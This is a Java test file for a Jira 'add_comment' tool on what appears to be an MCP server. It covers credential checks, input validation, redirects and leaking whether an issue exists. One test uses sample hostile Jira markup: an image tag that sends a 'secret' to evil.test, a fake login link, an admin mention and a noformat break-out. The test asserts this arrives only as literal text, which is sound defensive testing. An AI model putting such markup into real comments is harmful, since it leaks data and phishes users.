package pl.aiwcorpo.mcp.jira.app;

import static org.assertj.core.api.Assertions.assertThat;

import io.modelcontextprotocol.client.McpSyncClient;
import io.modelcontextprotocol.spec.McpSchema;
import java.util.Map;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

/** {@code add_comment}: an UPDATE tool that writes as the calling user. */
class AddCommentToolTest extends ServerTestSupport {

    @BeforeEach
    void resetBackend() {
        BACKEND.reset();
    }

    @Test
    void addsTheCommentAsTheUser() {
        try (McpSyncClient client = clientWithCredential(PAT)) {
            McpSchema.CallToolResult result = call(client, "add_comment",
                    Map.of("issueKey", "ABC-1", "body", "Reproduced on staging.\nSee logs."));

            assertThat(result.isError()).isFalse();
            assertThat(json(result).at("/issueKey").asString()).isEqualTo("ABC-1");
            assertThat(json(result).at("/commentId").asString()).isEqualTo("10500");
            assertThat(text(result)).doesNotContain("jkowalski@corp.test", "(echo)");
        }
        assertThat(BACKEND.requests()).extracting(StubBackend.Request::path)
                .containsExactly("/rest/api/2/issue/ABC-1", "/rest/api/2/project/ABC", "/rest/api/2/issue/ABC-1/comment");
        assertThat(BACKEND.requests().getLast()).satisfies(request -> {
            assertThat(request.method()).isEqualTo("POST");
            assertThat(request.path()).isEqualTo("/rest/api/2/issue/ABC-1/comment");
            assertThat(request.authorization()).isEqualTo(PAT);
            assertThat(JSON.readTree(request.body()).at("/body").asString())
                    .isEqualTo("{noformat}\nReproduced on staging.\nSee logs.\n{noformat}");
        });
    }

    @Test
    void isListedAsAnUpdateTool() {
        McpSchema.Tool tool = listedTool("add_comment");
        assertThat(tool.annotations().readOnlyHint()).isFalse();
        assertThat(tool.annotations().destructiveHint()).isFalse();
    }

    @Test
    void withoutCredentialAsksToConnectTheAccount() {
        try (McpSyncClient client = clientWithCredential(null)) {
            assertCredentialRequired(call(client, "add_comment", Map.of("issueKey", "ABC-1", "body", "x")));
        }
        assertThat(BACKEND.requests()).isEmpty();
    }

    @Test
    void aPatRejectedByJiraAsksToReconnect() {
        try (McpSyncClient client = clientWithCredential(StubBackend.EXPIRED_CREDENTIAL)) {
            assertCredentialRequired(call(client, "add_comment", Map.of("issueKey", "ABC-1", "body", "x")));
        }
    }

    @Test
    void missingAndForbiddenIssuesLookTheSame() {
        try (McpSyncClient client = clientWithCredential(PAT)) {
            McpSchema.CallToolResult missing = call(client, "add_comment", Map.of("issueKey", "ABC-404", "body", "x"));
            McpSchema.CallToolResult forbidden = call(client, "add_comment", Map.of("issueKey", "ABC-403", "body", "x"));

            assertNotFoundOrDenied(missing);
            assertThat(text(forbidden)).isEqualTo(text(missing));
        }
    }

    @Test
    void invalidArgumentsAreRejectedBeforeJira() {
        try (McpSyncClient client = clientWithCredential(PAT)) {
            assertInvalidArgument(call(client, "add_comment", Map.of("issueKey", "abc-1", "body", "x")),
                    "issueKey does not match the required format");
            assertInvalidArgument(call(client, "add_comment", Map.of("issueKey", "ABC-1", "body", "a\u0000b")),
                    "body contains control characters");
            assertInvalidArgument(call(client, "add_comment", Map.of("issueKey", "ABC-1", "body", "x".repeat(10_001))),
                    "body is longer than 10000 characters");
            assertThat(BACKEND.requests()).isEmpty();
            assertInvalidArgument(call(client, "add_comment", Map.of("issueKey", "ABC-1", "body", "   ")),
                    "body must be");
        }
        assertThat(BACKEND.writes()).as("the issue is read for the policy, a blank body is not written").isEmpty();
    }

    @Test
    void markupThatMakesRequestsOrNotificationsReachesJiraAsLiteralText() {
        String body = "see !https://evil.test/p.png?d=secret! [click|https://evil.test/login] [~admin] "
                + "{noformat}!https://evil.test/again.png!";
        try (McpSyncClient client = clientWithCredential(PAT)) {
            assertThat(call(client, "add_comment", Map.of("issueKey", "ABC-1", "body", body)).isError()).isFalse();
        }
        String sent = JSON.readTree(BACKEND.writes().getFirst().body()).at("/body").asString();
        assertThat(sent).startsWith("{noformat}\n").endsWith("\n{noformat}");
        String inside = sent.substring("{noformat}\n".length(), sent.length() - "\n{noformat}".length());
        assertThat(inside).contains("!https://evil.test/p.png?d=secret!", "[click|https://evil.test/login]", "[~admin]");
        assertThat(inside).as("the text cannot close the literal block").doesNotContainIgnoringCase("{noformat}");
    }

    @Test
    void aMovedIssueIsWrittenUnderItsNewKeyAndReportedWithIt() {
        try (McpSyncClient client = clientWithCredential(PAT)) {
            McpSchema.CallToolResult result = call(client, "add_comment",
                    Map.of("issueKey", "ABC-3", "body", "Moved, still relevant."));

            assertThat(result.isError()).isFalse();
            assertThat(json(result).at("/issueKey").asString()).isEqualTo("DEF-5");
        }
        assertThat(BACKEND.requests()).extracting(StubBackend.Request::method, StubBackend.Request::path)
                .containsExactly(org.assertj.core.groups.Tuple.tuple("GET", "/rest/api/2/issue/ABC-3"),
                        org.assertj.core.groups.Tuple.tuple("GET", "/rest/api/2/project/DEF"),
                        org.assertj.core.groups.Tuple.tuple("POST", "/rest/api/2/issue/DEF-5/comment"));
    }

    @Test
    void aRedirectIsNotFollowedAndNotReadAsMissing() {
        try (McpSyncClient client = clientWithCredential(PAT)) {
            McpSchema.CallToolResult result = call(client, "add_comment", Map.of("issueKey", "ABC-9", "body", "x"));

            assertThat(text(result)).contains("\"error\":\"internal_error\"");
            assertThat(BACKEND.elsewhereHits()).as("the PAT must not follow the Location").isEmpty();
        }
    }

    @Test
    void aCommentAnswerWithoutIdIsTheBackendsFault() {
        try (McpSyncClient client = clientWithCredential(PAT)) {
            assertThat(text(call(client, "add_comment", Map.of("issueKey", "ABC-17", "body", "x"))))
                    .contains("\"error\":\"internal_error\"");
        }
    }
}
